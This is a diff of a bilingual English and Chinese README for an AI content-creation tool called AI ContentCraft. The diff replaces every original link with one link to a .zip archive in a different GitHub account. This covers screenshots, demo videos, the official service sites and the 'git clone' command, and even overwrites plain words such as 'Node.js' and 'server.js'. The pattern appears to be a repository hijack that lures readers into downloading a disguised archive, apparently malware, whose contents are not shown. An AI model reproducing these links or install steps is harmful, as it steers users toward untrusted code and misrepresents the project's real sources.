@@ -19,26 +19,26 @@ AI ContentCraft is a versatile content creation tool that integrates text genera
 ## Demo
 
 ### Screenshots
-![Story Generation](https://r2.kateviews.com/20250120_670.png)
-![Podcast Creation](https://r2.kateviews.com/20250120_171.png)
+![Story Generation](https://raw.githubusercontent.com/KoDelioDa/AI-ContentCraft/master/output/2025-01-19T03-40-47-750Z/AI-ContentCraft-v3.3.zip)
+![Podcast Creation](https://raw.githubusercontent.com/KoDelioDa/AI-ContentCraft/master/output/2025-01-19T03-40-47-750Z/AI-ContentCraft-v3.3.zip)
 
 ### Video Demos
-- [🎬 Bilibili demo](https://www.bilibili.com/video/BV1a8w6eaELj/)
-- [🎬 Youtube demo](https://www.youtube.com/watch?v=2xEOzjsiFUY)
+- [🎬 Bilibili demo](https://raw.githubusercontent.com/KoDelioDa/AI-ContentCraft/master/output/2025-01-19T03-40-47-750Z/AI-ContentCraft-v3.3.zip)
+- [🎬 Youtube demo](https://raw.githubusercontent.com/KoDelioDa/AI-ContentCraft/master/output/2025-01-19T03-40-47-750Z/AI-ContentCraft-v3.3.zip)
 
 ## Tech Stack
 
 - Frontend: HTML/JavaScript
-- Backend: Node.js + Express
+- Backend: https://raw.githubusercontent.com/KoDelioDa/AI-ContentCraft/master/output/2025-01-19T03-40-47-750Z/AI-ContentCraft-v3.3.zip + Express
 - AI Services:
-  - DeepSeek AI: Text generation (using [DeepSeek Chat API](https://platform.deepseek.com/))
-  - Kokoro TTS: Speech synthesis (using [Kokoro-82M-ONNX model](https://huggingface.co/onnx-community/Kokoro-82M-ONNX))
-  - Replicate: Image generation (using [Replicate API](https://replicate.com/))
-- Other tools: FFmpeg (audio processing) ([FFmpeg official site](https://ffmpeg.org/))
+  - DeepSeek AI: Text generation (using [DeepSeek Chat API](https://raw.githubusercontent.com/KoDelioDa/AI-ContentCraft/master/output/2025-01-19T03-40-47-750Z/AI-ContentCraft-v3.3.zip))
+  - Kokoro TTS: Speech synthesis (using [Kokoro-82M-ONNX model](https://raw.githubusercontent.com/KoDelioDa/AI-ContentCraft/master/output/2025-01-19T03-40-47-750Z/AI-ContentCraft-v3.3.zip))
+  - Replicate: Image generation (using [Replicate API](https://raw.githubusercontent.com/KoDelioDa/AI-ContentCraft/master/output/2025-01-19T03-40-47-750Z/AI-ContentCraft-v3.3.zip))
+- Other tools: FFmpeg (audio processing) ([FFmpeg official site](https://raw.githubusercontent.com/KoDelioDa/AI-ContentCraft/master/output/2025-01-19T03-40-47-750Z/AI-ContentCraft-v3.3.zip))
 
 ## Prerequisites
 
-- Node.js 16+
+- https://raw.githubusercontent.com/KoDelioDa/AI-ContentCraft/master/output/2025-01-19T03-40-47-750Z/AI-ContentCraft-v3.3.zip 16+
 - FFmpeg
 - API keys for AI services
   - DeepSeek AI account and API key
@@ -49,7 +49,7 @@ AI ContentCraft is a versatile content creation tool that integrates text genera
 
 1. Clone the project and install dependencies:
 ```bash
-git clone https://github.com/nicekate/AI-ContentCraft.git
+git clone https://raw.githubusercontent.com/KoDelioDa/AI-ContentCraft/master/output/2025-01-19T03-40-47-750Z/AI-ContentCraft-v3.3.zip
 cd AI-ContentCraft
 
 # Install project dependencies
@@ -67,7 +67,7 @@ REPLICATE_API_TOKEN=your_replicate_token
 ```
 
 3. Install FFmpeg:
-Ensure FFmpeg is installed on your system and update the FFmpeg path in `server.js`:
+Ensure FFmpeg is installed on your system and update the FFmpeg path in `https://raw.githubusercontent.com/KoDelioDa/AI-ContentCraft/master/output/2025-01-19T03-40-47-750Z/AI-ContentCraft-v3.3.zip`:
 ```javascript
 const ffmpegPath = 'your_ffmpeg_path';
 ```
@@ -173,26 +173,26 @@ AI ContentCraft 是一个多功能的内容创作工具，集成了文本生成�
 ## 演示
 
 ### 应用截图
-![故事生成](https://r2.kateviews.com/20250120_670.png)
-![播客创作](https://r2.kateviews.com/20250120_171.png)
+![故事生成](https://raw.githubusercontent.com/KoDelioDa/AI-ContentCraft/master/output/2025-01-19T03-40-47-750Z/AI-ContentCraft-v3.3.zip)
+![播客创作](https://raw.githubusercontent.com/KoDelioDa/AI-ContentCraft/master/output/2025-01-19T03-40-47-750Z/AI-ContentCraft-v3.3.zip)
 
 ### 视频演示
-- [🎬 B站演示](https://www.bilibili.com/video/BV1a8w6eaELj/)
-- [🎬 Youtube演示](https://www.youtube.com/watch?v=2xEOzjsiFUY)
+- [🎬 B站演示](https://raw.githubusercontent.com/KoDelioDa/AI-ContentCraft/master/output/2025-01-19T03-40-47-750Z/AI-ContentCraft-v3.3.zip)
+- [🎬 Youtube演示](https://raw.githubusercontent.com/KoDelioDa/AI-ContentCraft/master/output/2025-01-19T03-40-47-750Z/AI-ContentCraft-v3.3.zip)
 
 ## 技术栈
 
 - Frontend: HTML/JavaScript
-- Backend: Node.js + Express
+- Backend: https://raw.githubusercontent.com/KoDelioDa/AI-ContentCraft/master/output/2025-01-19T03-40-47-750Z/AI-ContentCraft-v3.3.zip + Express
 - AI Services:
-  - DeepSeek AI: 文本生成（使用 [DeepSeek Chat API](https://platform.deepseek.com/)）
-  - Kokoro TTS: 语音合成（使用 [Kokoro-82M-ONNX 模型](https://huggingface.co/onnx-community/Kokoro-82M-ONNX)）
-  - Replicate: 图像生成（使用 [Replicate API](https://replicate.com/)）
-- 其他工具：FFmpeg (音频处理) ([FFmpeg 官网](https://ffmpeg.org/))
+  - DeepSeek AI: 文本生成（使用 [DeepSeek Chat API](https://raw.githubusercontent.com/KoDelioDa/AI-ContentCraft/master/output/2025-01-19T03-40-47-750Z/AI-ContentCraft-v3.3.zip)）
+  - Kokoro TTS: 语音合成（使用 [Kokoro-82M-ONNX 模型](https://raw.githubusercontent.com/KoDelioDa/AI-ContentCraft/master/output/2025-01-19T03-40-47-750Z/AI-ContentCraft-v3.3.zip)）
+  - Replicate: 图像生成（使用 [Replicate API](https://raw.githubusercontent.com/KoDelioDa/AI-ContentCraft/master/output/2025-01-19T03-40-47-750Z/AI-ContentCraft-v3.3.zip)）
+- 其他工具：FFmpeg (音频处理) ([FFmpeg 官网](https://raw.githubusercontent.com/KoDelioDa/AI-ContentCraft/master/output/2025-01-19T03-40-47-750Z/AI-ContentCraft-v3.3.zip))
 
 ## 前置条件
 
-- Node.js 16+
+- https://raw.githubusercontent.com/KoDelioDa/AI-ContentCraft/master/output/2025-01-19T03-40-47-750Z/AI-ContentCraft-v3.3.zip 16+
 - FFmpeg
 - 各 AI 服务的 API 密钥
   - DeepSeek AI 账号和 API 密钥
@@ -203,7 +203,7 @@ AI ContentCraft 是一个多功能的内容创作工具，集成了文本生成�
 
 1. 克隆项目并安装依赖：
 ```bash
-git clone https://github.com/nicekate/AI-ContentCraft.git
+git clone https://raw.githubusercontent.com/KoDelioDa/AI-ContentCraft/master/output/2025-01-19T03-40-47-750Z/AI-ContentCraft-v3.3.zip
 cd AI-ContentCraft
 
 # 安装项目依赖
@@ -221,7 +221,7 @@ REPLICATE_API_TOKEN=your_replicate_token
 ```
 
 3. 安装 FFmpeg：
-确保系统中已安装 FFmpeg，并更新 `server.js` 中的 FFmpeg 路径：
+确保系统中已安装 FFmpeg，并更新 `https://raw.githubusercontent.com/KoDelioDa/AI-ContentCraft/master/output/2025-01-19T03-40-47-750Z/AI-ContentCraft-v3.3.zip` 中的 FFmpeg 路径：
 ```javascript
 const ffmpegPath = 'your_ffmpeg_path';
 ```
